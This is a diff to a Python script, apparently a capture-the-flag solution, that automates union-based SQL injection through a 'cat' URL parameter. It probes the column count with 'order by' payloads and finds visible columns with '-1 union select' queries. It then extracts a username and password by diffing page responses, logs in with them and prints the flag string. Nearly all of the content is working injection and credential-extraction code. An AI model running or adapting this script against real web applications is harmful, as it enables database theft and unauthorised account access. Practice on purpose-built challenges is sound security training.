@@ -2,6 +2,8 @@
 import requests
 from requests.exceptions import HTTPError
 import difflib
+from bs4 import BeautifulSoup
+import re
 
 
 def get_request(url: str, param: dict) -> str:
@@ -18,13 +20,14 @@ def get_request(url: str, param: dict) -> str:
 
 def count_columns(url: str) -> int:
     max_columns = 10
-    html_responce = [''] * max_columns
+    html_responce_1 = ''
     for i in range(1, max_columns):
         param = dict(cat=f"1 order by {i}")
-        html_responce[i] = get_request(url, param)
-        for s in difflib.ndiff(html_responce[i], html_responce[i - 1]):
+        html_responce_2 = get_request(url, param)
+        for s in difflib.ndiff(html_responce_2, html_responce_1):
             if i > 1 and ('+' in s[0] or '-' in s[0]):
                 return i - 1
+            html_responce_1 = html_responce_2
     return 0
 
 
@@ -34,7 +37,7 @@ def find_visible_columns(url: str, base_name: str,
     param = dict(
         cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
     html_responce = get_request(url, param)
-
+    # find differens
     param = dict(cat=f"-1")
     html_base = get_request(url, param)
     for s in difflib.ndiff(html_responce, html_base):
@@ -60,7 +63,6 @@ def find_param(url: str, base_name: str, list_of_columns: list,
         # find differens
         n = -1
         key = [''] * len(find)
-        # for i, s in enumerate(difflib.ndiff(html_responce, html_visible)):
         for s in difflib.ndiff(html_responce, html_visible):
             if s[0] == ' ':
                 continue
@@ -92,6 +94,10 @@ def main():
     keys = find_param(url, base_name, list_of_columns,
                       list_of_visible, finds, html_visible)
     print(keys)
+    data = dict(user=keys[0], password=keys[1], login='Login')
+    response = requests.post(url, data)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    print(soup.find_all(string=re.compile("flag"))[0])
 
 
 if __name__ == '__main__':
